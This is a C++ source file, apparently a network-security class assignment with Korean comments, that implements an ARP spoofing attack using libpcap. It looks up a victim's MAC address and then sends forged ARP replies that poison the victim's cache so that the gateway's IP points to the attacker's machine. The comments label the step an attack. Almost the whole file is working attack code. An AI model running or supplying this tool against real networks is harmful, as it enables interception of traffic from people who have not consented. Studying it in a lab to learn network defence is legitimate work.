#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <unistd.h>


#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

EthArpPacket packet;

//함수 선언부
int getIPAddress(char* ip_addr, char* argv);
int getMacAddress(char* mac, char* argv);
void convrt_mac(const char *data, char *cvrt_str, int sz);

void usage() {
    printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test wlan0\n");
}

int getIPAddress(char* ip_addr, char* argv)
{
    char buf[20];
    int sock;
    struct ifreq ifr;
    struct sockaddr_in *sin;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (sock < 0)
    {
        printf("socket error\n");
        return 0;
    }

    strcpy(ifr.ifr_name, argv);

    if (ioctl(sock, SIOCGIFADDR, &ifr)< 0)
    {
        printf("ioctl() - get ip error\n");
        close(sock);
        return 0;
    }

    sprintf(ip_addr, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    close(sock);
    return 1;
}

int getMacAddress(uint8_t* mac, char* argv)
{

    int sock;
    struct ifreq ifr;
    char mac_adr[18] = {0,};

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (sock < 0)
    {
        printf("socket error\n");
        return 0;
    }

    strcpy(ifr.ifr_name, argv);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0)
    {
        printf("ioctl() - get mac error\n");
        close(sock);
        return 0;
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    close(sock);
    return 1;

}

//ARP에 이용되는 Send
int sendArpReply(pcap_t* handle, Mac* eth_dmac, char* eth_smac, char* arp_smac, char* arp_sip, Mac* arp_tmac, char* arp_tip)
{
    memset(&packet, 0, sizeof(packet));
    packet.eth_.dmac_ = *eth_dmac; //eth ff ff - 과제 victim Mac?
    packet.eth_.smac_ = Mac(eth_smac); //request eth smac / me
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);

    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply); //과제 Request Reply로 바꾸세요
    packet.arp_.smac_ = Mac(arp_smac); //request arp smac //과제 @@@ 어태커의 맥
    packet.arp_.sip_ = htonl(Ip(arp_sip)); //request arp sip @@@@게이트웨이의 아이피
    packet.arp_.tmac_ = *arp_tmac; //request arp tmac //상대방@@@
    packet.arp_.tip_ = htonl(Ip(arp_tip)); //request arp tip //
/*
    for(int i = 0; i<6; i++){
        printf("%x:",(*eth_dmac).mac_[i]);
    }
    printf("\n");
    for(int i = 0; i<6; i++){
        printf("%x:",Mac(eth_smac).mac_[i]);
    }
    printf("\n");
*/
    //printf("%x\n",htonl(Ip(arp_sip)));
    //printf("%x\n",htonl(Ip(arp_tip)));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    return res;
}
int sendArpReq(pcap_t* handle, char* eth_dmac, char* eth_smac, char* arp_smac, char* arp_sip, char* arp_tmac, char* arp_tip)
{
    memset(&packet, 0, sizeof(packet));
    packet.eth_.dmac_ = Mac(eth_dmac); //eth ff ff - 과제 victim Mac?
    packet.eth_.smac_ = Mac(eth_smac); //request eth smac / me
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);

    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request); //과제 Request Reply로 바꾸세요
    packet.arp_.smac_ = Mac(arp_smac); //request arp smac //과제 @@@ 어태커의 맥
    //printf("arp smac : %s\n", arp_smac);
    packet.arp_.sip_ = htonl(Ip(arp_sip)); //request arp sip @@@@게이트웨이의 아이피
    //printf("arp sip : %s\n", arp_sip);
    packet.arp_.tmac_ = Mac(arp_tmac); //request arp tmac //상대방@@@
    //printf("arp tmac : %s\n", arp_tmac);
    packet.arp_.tip_ = htonl(Ip(arp_tip)); //request arp tip //
    //printf("arp tip : %s\n", arp_tip);

    //패킷 송신시 handle, packet 필요
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    return res;
}


int getVictimMac(pcap_t* handle, char* myIp, char* myMac, char* targetIp, Mac* victimMac)
{
    sendArpReq(handle, "ff:ff:ff:ff:ff:ff", (char*)myMac, (char*)myMac, (char*)myIp, "00:00:00:00:00:00", (char*)targetIp);

        while(true)
        {
        struct pcap_pkthdr* header;
        const u_char* arp_res_packet;
        int res = pcap_next_ex(handle, &header, &arp_res_packet);

        if(res == 0) continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return 0;
        }
        if(header->caplen < sizeof(EthArpPacket)){
            continue;
        }

        EthArpPacket res_packet; //response Packet
        //EthArpPacket req_packet;

        memcpy(&res_packet, arp_res_packet, (size_t)sizeof(EthArpPacket));
        //memcpy(&req_packet, reinterpret_cast<const u_char*>(&packet),(size_t)sizeof(EthArpPacket));

        if( (res_packet.arp_.op_ == htons(ArpHdr::Reply)) && (res_packet.eth_.type_ == htons(EthHdr::Arp)))
        {
            *victimMac = res_packet.arp_.smac_;
            return 1;
        }
        else
          continue;
    }
}


int main(int argc, char* argv[]) {
    if (argc < 4) { //최소 인자는 4개 이상 들어가야함.
        usage();
        return -1;
    }

    char* dev = argv[1]; //인터페이스 인자
    char errbuf[PCAP_ERRBUF_SIZE]; //에러처리?
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); // pcap open
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    char myIp[20] = {0, }; //4바이트
    char* victimIp;
    char* gatewayIp;

    uint8_t myMac[6] = {0, }; //6바이트
    char myMacStr[] = "00:00:00:00:00:00";
    Mac victimMac; //memcpy 실패로 인해 바꿈.

    getIPAddress(myIp, argv[1]);
    printf("my ip : %s\n", (char*)myIp);


    getMacAddress(myMac, argv[1]);
    printf("my mac : %02x %02x %02x %02x %02x %02x\n", myMac[0], myMac[1], myMac[2], myMac[3], myMac[4], myMac[5]);

    sprintf(myMacStr, "%02x:%02x:%02x:%02x:%02x:%02x", myMac[0], myMac[1], myMac[2], myMac[3], myMac[4], myMac[5]);

    //printf("my ip : %s\n", myIp);
    //printf("my mac : %s\n", myMacStr);


    for(int i = 1 ; i < argc/2 ; i++)
    {
        //인자로 받은 IP 저장
        victimIp = argv[2*i];
        gatewayIp = argv[2*i + 1];

        //Victim MAC주소
        getVictimMac(handle, myIp, myMacStr, victimIp, &victimMac);

        //ARP 공격
        sendArpReply(handle, &victimMac, myMacStr, myMacStr, gatewayIp, &victimMac, victimIp);

        printf("ARP SUCCESS\n");

    }


    pcap_close(handle);
}
